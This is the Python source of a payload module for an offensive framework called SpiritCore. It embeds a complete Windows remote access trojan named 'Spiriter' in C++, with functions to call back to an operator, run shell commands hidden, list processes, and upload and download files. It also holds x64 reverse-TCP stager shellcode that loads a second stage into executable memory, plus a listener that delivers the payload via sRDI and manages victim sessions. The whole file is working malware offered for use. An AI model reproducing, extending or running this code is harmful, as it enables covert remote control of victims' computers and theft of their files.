# -*- coding: UTF-8 -*-
from SpiritCore.Lib.Payload import RunShellCodePayload
from SpiritCore.Payload import *
from SpiritCore.FCmd import *
from SpiritCore.Lib.ShellcodeRDI import *
from SpiritCore.Lib.Socket import *
import socket,uuid
from SpiritCore.Lib.Spiriter import *
from struct import pack,unpack
from SpiritCore.Lib.Build import *
import threading
from shutil import copyfile

SpiriterHeader = b"Spiriter"
SpiriterVersion=b"1.00"


CCodes="""

#include<windows.h>
#include<cstdio>
#include<cmath>
#include <tlhelp32.h>
#include<vector>
#include<iostream>
#include <shlwapi.h>
using namespace std;


#pragma comment(lib,\"ws2_32.lib\")
#pragma comment(lib, \"shlwapi.lib\")



#define BUFFER_SIZE        4124
#define SPIRITER_INIT    0x0
#define SPIRITER_PS        0x1
#define SPIRITER_EXEC    0x2
#define SPIRITER_UPLOAD 0x3
#define SPIRITER_DOWN    0x4



typedef struct RatRet {
    char Header[8];
    DWORD Command;
    DWORD DataSize;
    DWORD ToalLength;
    DWORD SendCount;
    DWORD ToalCount;
    char * Buffer;
}RetData, *PRetData;


typedef struct Rat{
    char Header[8];
    DWORD Command;
    DWORD DataSize;
    DWORD ToalLength;
    DWORD SendCount;
    DWORD ToalCount;
    char Buffer[4096];
}DataStruct,*PDataStruct;

typedef struct FileUpload {
    char Filename[260];
    DWORD FileSize;
}FileUpload,*PFileUpload;



class RAT
{
    
public:
    SOCKET Socket;
    RAT();
    ~RAT();
    VOID ExecCode(RetData Ret);
    void EnumProcess();  
    BOOL Send(DWORD Commnad,char *Data, DWORD ToalLength);
    RetData Receive();
    BOOL PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwResultBufferSize);
    BOOL WriteFileA(RetData Ret);
    BOOL Download(RetData Ret);
private:

};


RAT::RAT()
{
    WORD SockVersion ;
    WSAData WsaData;
    sockaddr_in sockAddr;
    RetData Ret;
    SockVersion = MAKEWORD(2, 2);
    if (WSAStartup(SockVersion, &WsaData)!=0) {
        printf(\"ERROR\");
        exit(0);
    }
    this->Socket= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    memset(&sockAddr, 0, sizeof(sockAddr));  
    sockAddr.sin_family = PF_INET;
    sockAddr.sin_addr.s_addr = inet_addr(\"IPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIP\");
    sockAddr.sin_port = htons(PORTPORTPORTPORTPORT);
    connect(this->Socket, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
    char Buffer[4096];
    memset(Buffer, 0, sizeof(Buffer));
    char PipeRel[2048];
    char whoami[1024];
    //PipeCmd((char *)\"powershell -c \\\"Get-WmiObject Win32_OperatingSystem | Format-List BootDevice, BuildNumber, BuildType, Caption, CodeSet, CountryCode, CreationClassName, CSCreationClassName, CSDVersion, CSName, Description, Locale, Manufacturer, Name, Organization, OSArchitecture, OtherTypeDescription, PlusProductID, PlusVersionNumber, RegisteredUser, SerialNumber, Status, SystemDevice, SystemDirectory, SystemDrive, Version, WindowsDirectory\\\"\", PipeRel, 2048);
    //PipeCmd((char*)\"whoami\", whoami, 1024);

    sprintf(Buffer,\"========================================System==========================\\n%s\\n=================Whoami==============================\\nwhoami%s\\n========================================\", PipeRel, whoami);
    Send(0x0, Buffer, strlen(Buffer));
    memset(Buffer, 0, sizeof(Buffer));
    while (true)
    {
        Ret = this->Receive();
        if (Ret.Command == SPIRITER_INIT) {
            Send(0x0, Buffer, sizeof(Buffer));
            continue;
        }
        else if (Ret.Command == SPIRITER_PS) {
            EnumProcess();

            continue;
        }
        else if (Ret.Command == SPIRITER_EXEC) {
            ExecCode(Ret);
            continue;
        }
        else if (Ret.Command == SPIRITER_UPLOAD) {
            WriteFileA(Ret);
        }
        else if (Ret.Command == SPIRITER_DOWN) {
            Download(Ret);
        }
        
        free(Ret.Buffer);
        Ret.Buffer = NULL;

    }
    


    
}

RAT::~RAT()
{
    closesocket(this->Socket);
    WSACleanup();
}


BOOL RAT::Send(DWORD Commnad, char* Data, DWORD ToalLength)
{

    char* Buffer = NULL;
    char Send[4124];
    int nCount = 0;
    int SendRet = 0;
    int SendLenght = 0;
    int SendCount=0;
    int SendedSize=0;
    PDataStruct Value;
    memset(&Send, 0, sizeof(Send));
    Value = (PDataStruct)&Send;
    memcpy(Value->Header, \"Spiriter\", sizeof(\"Spiriter\"));
    Value->ToalLength = ToalLength;
    Value->Command = Commnad;
    nCount = ToalLength / 4096; 

    if ((nCount % 4096) >= 0  && (ToalLength   > 4096)) {
        nCount++;
    }
    else if(ToalLength<4096) {
        nCount++;
    }
    Value->ToalCount = nCount;
 
    while (true)
    {
        SendCount++;
        Value->SendCount = SendCount;
        if (ToalLength - SendedSize <= 4096) {
  
            SendLenght= ToalLength - SendedSize;
            Value->DataSize = SendLenght;
            memcpy(Value->Buffer, Data + SendedSize, SendLenght);
            SendRet = send(Socket, Send, sizeof(Send), 0);
            SendedSize = SendedSize + SendLenght;
            if (SendRet == SendLenght+28) {
                if (SendedSize == Value->ToalLength) {
                    printf(\"Sended:%d,ToalLength:%d\", SendedSize, ToalLength);
                    return true;
                }
            }
            break;
            
        }
        else {
           
            SendLenght = 4096;
            Value->DataSize = SendLenght;
            memcpy(Value->Buffer, Data + SendedSize, SendLenght);
            SendRet = send(Socket, Send, sizeof(Send), 0);
            if (SendRet == SendLenght+28) {
                SendedSize = SendedSize + 4096;
            }
            
        }
        
        
        
    }
    
    return 0;
}



RetData RAT::Receive()
{
  
    PRetData Ret;
    char* Buffer = NULL;
    char RecvBuffer[BUFFER_SIZE];
    Ret = (PRetData)RecvBuffer;
    int ToalLength = 0;
    int WriteLengt = 0;
    DWORD Count = 0;
    char Header[9];
    memset(&RecvBuffer, 0, sizeof(RecvBuffer));
    while (true)
    {
        Count++;
        memset(Header, 0, sizeof(Header));
        recv(this->Socket, RecvBuffer, BUFFER_SIZE, 0);
        memcpy(Header, Ret->Header, 8);
        if (Ret->DataSize > 4096) {
            ExitProcess(0);
        }
        if (strcmp(Header, \"Spiriter\") == 0) {
            if (Buffer == NULL) {
                ToalLength = Ret->ToalLength;
                Buffer = (char*)malloc(ToalLength);
                memset(Buffer, 0, ToalLength);
            }
            if(Count == Ret->SendCount){ 
                memcpy(Buffer + WriteLengt, RecvBuffer + 28, Ret->DataSize);
                WriteLengt = WriteLengt + Ret->DataSize;
            }
            else {
                Count = 0; ToalLength = 0;
                free(Buffer);
                Buffer = NULL;
                continue; 
            }
            if (ToalLength == WriteLengt && Count == Ret->SendCount ) {
                Ret->Buffer = Buffer;
                return *Ret;
            }
            else {
                continue;
            }

        }
        else {
            continue;
        }



    }

    return *Ret;
}







BOOL RAT::PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwResultBufferSize)
{
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    BOOL bRet = FALSE;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.nLength = sizeof(securityAttributes);
    securityAttributes.lpSecurityDescriptor = NULL;
    bRet = ::CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0);
    if (FALSE == bRet)
    {
        return FALSE;
    }
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    bRet = ::CreateProcessA(NULL, pszCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (FALSE == bRet)
    {
        printf(\"Error\");
    }
    ::WaitForSingleObject(pi.hThread, INFINITE);
    ::WaitForSingleObject(pi.hProcess, INFINITE);
    ::RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
    ::ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, NULL, NULL);
    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);
    ::CloseHandle(hWritePipe);
    ::CloseHandle(hReadPipe);
    hWritePipe = NULL;

    hReadPipe = NULL;

    return TRUE;
}

BOOL RAT::WriteFileA(RetData Ret) {
    FileUpload FileInfo;
    memset(&FileInfo, 0, sizeof(FileUpload));
    memcpy(&FileInfo, Ret.Buffer, sizeof(FileUpload));
    char *WriteBuffer=(char *)malloc(FileInfo.FileSize);
    HANDLE FileObject=CreateFile(FileInfo.Filename,GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwWrite;
    BOOL status = WriteFile(FileObject, Ret.Buffer + sizeof(FileUpload), FileInfo.FileSize, &dwWrite, NULL);
    free(WriteBuffer);
    WriteBuffer = NULL;
    CloseHandle(FileObject);
    char Buffer[4096];
    memset(Buffer, 0, sizeof(Buffer));
    if (status) {
        this->Send(0x0, Buffer, sizeof(Buffer));
    }
    else {
        DWORD ErrorCode = GetLastError();
        sprintf(Buffer, \"Error:%d\", ErrorCode);
        this->Send(0x3, Buffer, strlen(Buffer));
    }
    return TRUE;
}

BOOL RAT::Download(RetData Ret)
{
    FileUpload FileInfo; 
    FileUpload Downloads;
    WIN32_FIND_DATA wfd;
    char Filename[MAX_PATH];
    DWORD FileLenght = 0;
    DWORD dwBytesRead = 0;
    char* Buffer = NULL;
    char* SendBuffer = NULL;
    memset(Filename, 0, sizeof(Filename));
    memset(&Downloads, 0, sizeof(Downloads));
    memset(&FileInfo, 0, sizeof(FileUpload));
    memcpy(&FileInfo, Ret.Buffer, sizeof(FileUpload));
    memcpy(Filename, FileInfo.Filename, sizeof(Filename));
    HANDLE hFind = FindFirstFile(FileInfo.Filename, &wfd);
    if (INVALID_HANDLE_VALUE != hFind){
        
        if (PathFileExists(Filename)) {
            HANDLE handle = CreateFile(Filename, GENERIC_READ, FILE_SHARE_READ,
                NULL,
                OPEN_EXISTING,       
                FILE_ATTRIBUTE_NORMAL,
                NULL);
            FileLenght = GetFileSize(handle, NULL);
            Buffer = (char*)malloc(FileLenght);
            SendBuffer = (char*)malloc(FileLenght + sizeof(FileUpload));

            memset(Buffer,0, FileLenght);
            memset(SendBuffer,0, FileLenght + sizeof(FileUpload));
            DWORD dwBytesToRead = FileLenght;
            dwBytesRead = 0;
            char *tmpBuf = Buffer;
            do {
                if (ReadFile(handle, tmpBuf, dwBytesToRead, &dwBytesRead, NULL)) {
                    
                }
                else {
                    DWORD ErrorCode= GetLastError();
                    Send(ErrorCode,(char *)\"\\x00\", 1);
                    return FALSE;
                }
            
            if (dwBytesRead == 0)
                break;

            dwBytesToRead -= dwBytesRead;
            tmpBuf += dwBytesRead;

            } while (dwBytesToRead > 0);
            strcpy(Downloads.Filename, Filename);
            Downloads.FileSize = FileLenght;
            memcpy(SendBuffer, &Downloads, sizeof(FileUpload));
            memcpy(SendBuffer + sizeof(FileUpload), Buffer, FileLenght);
            if(Send(0x0, SendBuffer, FileLenght + sizeof(FileUpload))) {
                
            }else {
                return FALSE;
            }
            Buffer = NULL;
            SendBuffer = NULL;
            CloseHandle(handle);
        }
        
    }
    else {
        Send(0x3, (char*)\"\\x00\",1);
        return FALSE;
    }

     return 0;
}

VOID RAT::ExecCode(RetData Ret)
{
    char Buffer[4096];
    memset(Buffer,0,sizeof(Buffer));
    PipeCmd(Ret.Buffer, Buffer, sizeof(Buffer));
    char* SendBuffer = (char *)malloc(strlen(Buffer));
    memset(SendBuffer,0, strlen(Buffer));
    memcpy(SendBuffer, Buffer, strlen(Buffer));
    Send(SPIRITER_EXEC, SendBuffer, strlen(Buffer));
    free(SendBuffer);
    SendBuffer = NULL;
    
}

void RAT::EnumProcess()
{
        vector<PROCESSENTRY32> vecProcess;
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE)
        {
            
            return;
        }
        PROCESSENTRY32 struProEntry32 = { 0 };
        struProEntry32.dwSize = sizeof(struProEntry32);
        BOOL bRes = Process32First(hSnap, &struProEntry32);
        int pNums = 0;
        while (bRes)
        {
            pNums++;
            vecProcess.push_back(struProEntry32);
            bRes = Process32Next(hSnap, &struProEntry32);
        }
        printf(\"Process Count:%d\\n\", vecProcess.size());
        DWORD SendLenth=0;
        SendLenth = vecProcess.size() *( MAX_PATH + 40);
        char* Buffer = (char *)malloc(SendLenth);
        memset(Buffer, 0, SendLenth);
        char Form[MAX_PATH + 40 - 1];
        int WriteOffset=0;
        for(int i{} ; i <= (vecProcess.size()-1);i++) {
            memset(Form, 0, sizeof(Form));
            sprintf(Form, \"%s        %d\\n\", vecProcess[i].szExeFile, vecProcess[i].th32ProcessID);
            memcpy(Buffer + WriteOffset, Form, strlen(Form));
            WriteOffset += strlen(Form);
        }
        CloseHandle(hSnap);
        Send(0x1, Buffer, SendLenth / 2);
    

}
"""


EXE ="""

int main(int argc,char argv[]) {
    
    RAT Objecy;
    return 0;
}
"""
DLL="""

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    RAT Objecy;
    return TRUE;
}


"""



NAsmCode="""

bits 64 
section .text
global start
cld ; Clear the direction flag.
and rsp, ~0xF ;Ensure RSP is 16 byte aligned
call start; Call start, this pushes the address of 'api_call' onto the stack.
api_call:
push r9; Save the 4th parameter
push r8; Save the 3rd parameter
push rdx ; Save the 2nd parameter
push rcx ; Save the 1st parameter
push rsi ; Save RSI
xor rdx, rdx ; Zero rdx
mov rdx, [gs:rdx+96] ; Get a pointer to the PEB
mov rdx, [rdx+24]; Get PEB->Ldr
mov rdx, [rdx+32]; Get the first module from the InMemoryOrder module list
next_mod:;
mov rsi, [rdx+80]; Get pointer to modules name (unicode string)
movzx rcx, word [rdx+74] ; Set rcx to the length we want to check
xor r9, r9 ; Clear r9 which will store the hash of the module name
loop_modname:;
xor rax, rax ; Clear rax
lodsb; Read in the next byte of the name
cmp al, 'a'; Some versions of Windows use lower case module names
jl not_lowercase ;
sub al, 0x20 ; If so normalise to uppercase
not_lowercase: ;
ror r9d, 13; Rotate right our hash value
add r9d, eax ; Add the next byte of the name
loop loop_modname; Loop untill we have read enough
; We now have the module hash computed
push rdx ; Save the current position in the module list for later
push r9; Save the current module hash for later
; Proceed to itterate the export address table,
mov rdx, [rdx+32]; Get this modules base address
mov eax, dword [rdx+60]; Get PE header
add rax, rdx ; Add the modules base address
cmp word [rax+24], 0x020B ; is this module actually a PE64 executable?
; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
; their may be a PE32 module present in the PEB's module list, (typicaly the main module).
; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
jne get_next_mod1 ; if not, proceed to the next module
mov eax, dword [rax+136] ; Get export tables RVA
test rax, rax; Test if no export address table is present
jz get_next_mod1 ; If no EAT present, process the next module
add rax, rdx ; Add the modules base address
push rax ; Save the current modules EAT
mov ecx, dword [rax+24]; Get the number of function names
mov r8d, dword [rax+32]; Get the rva of the function names
add r8, rdx; Add the modules base address
; Computing the module hash + function hash
get_next_func: ;
jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
dec rcx; Decrement the function name counter
mov esi, dword [r8+rcx*4]; Get rva of next module name
add rsi, rdx ; Add the modules base address
xor r9, r9 ; Clear r9 which will store the hash of the function name
; And compare it to the one we want
loop_funcname: ;
xor rax, rax ; Clear rax
lodsb; Read in the next byte of the ASCII function name
ror r9d, 13; Rotate right our hash value
add r9d, eax ; Add the next byte of the name
cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
jne loop_funcname; If we have not reached the null terminator, continue
add r9, [rsp+8]; Add the current module hash to the function hash
cmp r9d, r10d; Compare the hash to the one we are searchnig for
jnz get_next_func; Go compute the next function hash if we have not found it
; If found, fix up stack, call the function and then value else compute the next one...
pop rax; Restore the current modules EAT
mov r8d, dword [rax+36]; Get the ordinal table rva
add r8, rdx; Add the modules base address
mov cx, [r8+2*rcx] ; Get the desired functions ordinal
mov r8d, dword [rax+28]; Get the function addresses table rva
add r8, rdx; Add the modules base address
mov eax, dword [r8+4*rcx]; Get the desired functions RVA
add rax, rdx ; Add the modules base address to get the functions actual VA
; We now fix up the stack and perform the call to the drsired function...
finish:
pop r8 ; Clear off the current modules hash
pop r8 ; Clear off the current position in the module list
pop rsi; Restore RSI
pop rcx; Restore the 1st parameter
pop rdx; Restore the 2nd parameter
pop r8 ; Restore the 3rd parameter
pop r9 ; Restore the 4th parameter
pop r10; pop off the return address
sub rsp, 32; reserve space for the four register params (4 * sizeof(QWORD) = 32)
 ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
push r10 ; push back the return address
jmp rax; Jump into the required function
; We now automagically return to the correct caller...
get_next_mod:;
pop rax; Pop off the current (now the previous) modules EAT
get_next_mod1: ;
pop r9 ; Pop off the current (now the previous) modules hash
pop rdx; Restore our position in the module list
mov rdx, [rdx] ; Get the next module
jmp next_mod ; Process this module
start:
pop rbp ; block API pointer


reverse_tcp:
  ; setup the structures we need on the stack...
  mov r14, 'ws2_32'
  push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
  mov r14, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)
  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
  mov r12, 0x%s%s0002        
  push r12               ; host 127.0.0.1, family AF_INET and port 4444
  mov r12, rsp           ; save pointer to sockaddr struct for connect call
  ; perform the call to LoadLibraryA...
  mov rcx, r14           ; set the param for the library to load
  mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               ; LoadLibraryA( "ws2_32" )
  ; perform the call to WSAStartup...
  mov rdx, r13           ; second param is a pointer to this stuct
  push 0x0101            ;
  pop rcx                ; set the param for the version requested
  mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
  call rbp               ; WSAStartup( 0x0101, &WSAData );
  ; perform the call to WSASocketA...
  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
  push rax               ; push null for reserved parameter
  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
  xor r8, r8             ; we do not specify a protocol
  inc rax                ;
  mov rdx, rax           ; push SOCK_STREAM
  inc rax                ;
  mov rcx, rax           ; push AF_INET
  mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  mov rdi, rax           ; save the socket for later
  ; perform the call to connect...
  push byte 16           ; length of the sockaddr struct
  pop r8                 ; pop off the third param
  mov rdx, r12           ; set second param to pointer to sockaddr struct
  mov rcx, rdi           ; the socket
  mov r10d, 0x6174A599   ; hash( "ws2_32.dll", "connect" )
  call rbp               ; connect( s, &sockaddr, 16 );
  ; restore RSP so we dont have any alignment issues with the next block...
  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations

  
recv:
  ; Receive the size of the incoming second stage...
  sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
  mov rdx, rsp           ; set pointer to this buffer
  xor r9, r9             ; flags
  push byte 4            ; 
  pop r8                 ; length = sizeof( DWORD );
  mov rcx, rdi           ; the saved socket
  mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
  call rbp               ; recv( s, &dwLength, 4, 0 );
  add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next
  ; Alloc a RWX buffer for the second stage
  pop rsi                ; pop off the second stage length
  mov esi, esi           ; only use the lower-order 32 bits for the size
  push byte 0x40         ; 
  pop r9                 ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; 
  pop r8                 ; MEM_COMMIT
  mov rdx, rsi           ; the newly recieved second stage length.
  xor rcx, rcx           ; NULL as we dont care where the allocation is.
  mov r10d, 0xE553A458   ; hash( "kernel32.dll", "VirtualAlloc" )
  call rbp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  ; Receive the second stage and execute it...
  mov rbx, rax           ; rbx = our new memory address for the new stage
  mov r15, rax           ; save the address so we can jump into it later
read_more:               ;
  xor r9, r9             ; flags
  mov r8, rsi            ; length
  mov rdx, rbx           ; the current address into our second stages RWX buffer
  mov rcx, rdi           ; the saved socket
  mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
  call rbp               ; recv( s, buffer, length, 0 );
  add rbx, rax           ; buffer += bytes_received
  sub rsi, rax           ; length -= bytes_received
  test rsi, rsi          ; test length
  jnz short read_more    ; continue if we have more to read
  jmp r15                ; return into the second stage


exitfunk:
  mov ebx, 0x0A2A1DE0   ; The EXITFUNK as specified by user...
  mov r10d, 0x9DBD95A6  ; hash( "kernel32.dll", "GetVersion" )
  call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)
  add rsp, 40           ; cleanup the default param space on stack
  cmp al, byte 6        ; If we are not running on Windows Vista, 2008 or 7
  jl short goodbye      ; Then just call the exit function...
  cmp bl, 0xE0          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
  jne short goodbye     ;
  mov ebx, 0x6F721347   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
goodbye:                ; We now perform the actual call to the exit function
%s
"""



ProcessExit="""
  push byte 0           ;
  pop rcx               ; set the exit function parameter
  mov r10d, ebx         ; place the correct EXITFUNK into r10d
  call rbp              ; call EXITFUNK( 0 );
"""
class Payloads(Payload):
    Info = {
        "Name": "Windows Spiriter ",
        "Author": "ZSD 3HE11",
        "Description": "Spiriter backdoor frame. It is compiled by cmake and generated by msf payload. It is still in the development stage and the function is not perfect",
        "Options": (
            ("LocalHost", "0.0.0.0", True, 'Local listen Address'),
            ("LocalPort", "4444", True, 'Local listen port'),
            ("Port", "4444", True, ' The puppet machine is connected to the port'),
            ("RemoteHost", "192.168.70.1", True, 'The puppet machine connects to the address'),
        )
    }
    Support=True
    OS=1
    ListThread=None
    Size=0
    File=""
    STDOUT=False
    supportfile=["dll","exe"]
    SObject=None
    SessionObject=None
    Type="Spiriter"
    Types="Spiriter"
    RDIData=b""
    Copy=True
    GenerateType="Spiriter"
    def Generate(self):
        try:
            self.Init()
        except:
            pass
        AsmCode=NAsmCode
        ip_bytes=[]
        ip=self.Parameate["RemoteHost"]
        port=self.Parameate["Port"]
        ip_bytes.append(hex(unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-2:])
        ip_bytes.append(hex(unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-4:-2])
        ip_bytes.append(hex(unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][-6:-4])
        ip_bytes.append(hex(unpack('>L',socket.inet_aton(ip))[0]).rstrip('L')[2:][:-6])

        port_htons = hex(socket.htons(int(port)))
        byte1 = port_htons[4:]
        if byte1 == '':
            byte1 = '0'
        byte2 = port_htons[2:4]
        AsmCode=AsmCode%("".join(ip_bytes),byte2+byte1,ProcessExit)
        NasmObject = NASM()
        NasmObject.SourceCode=AsmCode
        Filename = NasmObject.Generate()
        if Filename=="":
            return b""
        else:
            return open(Filename,"rb").read()
        

    def GenerateFile(self):
        if self.GenerateType=="Spiriter":
            return self.GenerateSpiriter()
        elif self.GenerateType=="Shellcode":
            Object = CMAKE()

            RunSCOBJECT = RunShellCodePayload(self)
            RunSCOBJECT.ShellCode=self.Generate()
            RunSCOBJECT.RunType=self.Type
            RunSCOBJECT.Encode="None"
            RunSCOBJECT.init()
            Object.Types=self.Type
            Object.STDOUT=self.STDOUT
            print_msg("Generate Lenght:%d"%len(RunSCOBJECT.ShellCode))
            Object.SourceCode=RunSCOBJECT.Generate()
            Filename=Object.Generate()
            if(Filename==""):
                print_error("Generate Error.....")
            else:
                print_success("Generate:%s"%self.File)
                copyfile(Filename,self.File)
                return Filename
            
    def GenerateSpiriter(self):
        Codes=CCodes
        if self.File=="":
            self.File="shellcode"
        Object = CMAKE()
        try:
            Object.Filename=self.File.split(".")[0]
        except:
            Object.Filename=self.File
        
        Object.CppCmakeLists+="""
target_link_options({0} PUBLIC "LINKER:-Bdynamic")
target_link_libraries({0} wsock32 ws2_32)
target_link_libraries({0} shlwapi shlwapi)
target_link_options({0} PUBLIC "LINKER:-Bstatic")
if(CMAKE_BUILD_TOOL MATCHES "(msdev|devenv|nmake)")
    add_definitions(/W0)
endif()
        """.format(Object.Filename)    
        if(self.Type=="exe"):
            Codes+=EXE
            Object.Types="exe"
        elif self.Type=="dll":
            Codes+=DLL
            Object.Types="dll"
        Codes=Codes.replace("IPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIP",self.Parameate["RemoteHost"])
        Codes=Codes.replace("PORTPORTPORTPORTPORT",str(self.Parameate["Port"]))
        Object.SourceCode=Codes
        Object.STDOUT=self.STDOUT
        Filename=Object.Generate()
        if(Filename==""):
            print_error("Generate Error.....")
        else:
            if self.GenerateType=="Spiriter":
                print_success("Generate:%s"%self.File)
                if self.Copy:
                    copyfile(Filename,self.File)
                    return Filename
                else:
                    return Filename
            elif self.GenerateType=="Shellcode":
                pass

    def SessionInfo(self):
        pass #return "%s:%s  <----- Hacker"%(self.Parameate['TargetIp'],self.Parameate['Port'])
    def Listen(self,Obj):
        write("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\nIn order to adapt to port forwarding and so on, our Spiriter deliberately uses RemoteHost and Port as the connection address and port, and LocalHost and LocalPort as the local listening port and address.")
        if bool_chions("No","Please confirm whether the RemoteHost parameters are correct")==True:
            pass
        else:
            print_error("Exit the listener")
            return
        WriteLogs("Listen Port%d"%self.Parameate["LocalPort"])
        Sock =socket.socket()
        host = self.Parameate['LocalHost']
        port = int(self.Parameate['LocalPort'])
        try:
            Sock.bind((host, port))
        except Exception as error:
            print_error(error.__str__())
            return
        
        Sock.listen(1024)
        print_success("Start listening port: %s:%d"%(host,port))
        L=ListenWaiter()
        L.init(self,Sock)
        self.Init()
        self.Copy = False
        self.Type="dll"
        self.GenerateType="Spiriter"
        self.STDOUT=False
        print_msg("Start to generate the DLL required by sRdi")
        print_warning("Please wait for the compilation to complete,")
        DLLPath=self.GenerateSpiriter()
        self.Copy=True
        print_msg("The generated dll path:%s"%DLLPath)
        self.STDOUT=False
        L.Parame(self.Parameate,DLLPath)
        self.SessionObject.ListThread=L
        self.SessionObject.ListThread.setDaemon(True)
        self.SessionObject.ListThread.start()
    def Console(self,Sock):
        Sess = Spiriter()
        #write(Sock)
        #write(self.SessionObject.SpiriterSession[Sock])
        SessSock=Sock
        Sess.inti(SessSock)
        
class ListenWaiter(threading.Thread):
    sRdiData=b""
    LOCK=None
    ShellCode=b""
    Parameate=[]
    def __init__(self):
        threading.Thread.__init__(self)
        try:
            self.lock=threading.Lock()
        except Exception as error:
            write(error)
    def Parame(self,Parame,DLLPATH):
        self.Parameate=Parame
        self.DllPath=DLLPATH
    def setRdi(self):
        dll = open(self.DllPath, 'rb').read()
        self.sRdiData = ConvertToShellcode(dll, HashFunctionName("SayHello"), b"dave", 0)
    def init(self,Object,Socket):
        self.Object=Object
        self.Socket=Socket
    def TrySession(self,Sock):
        self.setRdi()
        TryDatxa=b""
        Sock.settimeout(5)
        try:
            TryData=Sock.recv(4096+28)
        except:
            self.SessionInti(Sock)
            return
        print_success("Reconnect message received Length:%d (Bytes)"%len(TryData))
        if(TryData[:8]==b"Spiriter"):
            Version = TryData[8:8+4]
            Length=unpack("i",TryData[12:12+4])[0]
            ToalLength= unpack("i",TryData[16:16+4])[0]
            SendCount=unpack("i",TryData[20:20+4])[0]
            ToalCount=unpack("i",TryData[24:24+4])[0]
            return True
        else:
            return False
    def SessionInti(self,Socket):
        print_msg("Initializing the connection back session, sending srdi data")
        data = self.sRdiData
        Length=len(data)
        print_msg("Send Payload total length:(%d bytes)"%Length)
        Socket.sendall(struct.pack("I",Length))
        ncount = Length / 1460
        if (Length % 1460) > 0:
            ncount += 1
        d=0
        for i in range(int(ncount)):
            try:
                d=d+1
                #write(i)
                if i < ncount-1:
                    #totalDataCount = pack("<H",4096)
                    make_data = data[i*1460:(i+1)*1460]
                else:
                    #totalDataCount = pack("<H",Length - 4096*i)
                    make_data = data[i*1460:]
                SpiriterData=make_data
            except Exception as e:
                print_error(e.__str__())   
            Socket.sendall(SpiriterData)
    def run(self):  #
        while True:
            c,addr = self.Socket.accept()
            print_success("New Session %s:%d <- %s:%d"%(self.Object.Parameate["LocalHost"],int(self.Object.Parameate["LocalPort"]), str(addr[0]),addr[1]))
            if(self.TrySession(c)):
                UUID = uuid.uuid1().__str__()
                self.UUID = UUID
                print_success("The session is initialized,Session:%s   " % (UUID))
                self.Object.SObject.SessionManager.update({UUID: self.Object.SessionObject})
                self.Object.SObject.UsePayloadObject.SetUUidSession(UUID)
                self.Object.SObject.SessionManager[UUID].SessionInfo="Spiriter %s:%d"%( (addr[0]),addr[1])
                self.Object.SObject.SessionManager[UUID].UUID=UUID
                self.Object.SessionObject.SpiriterSession.update({UUID:c})
                print_success("Current total number of sessions:%d"%len(self.Object.SObject.SessionManager))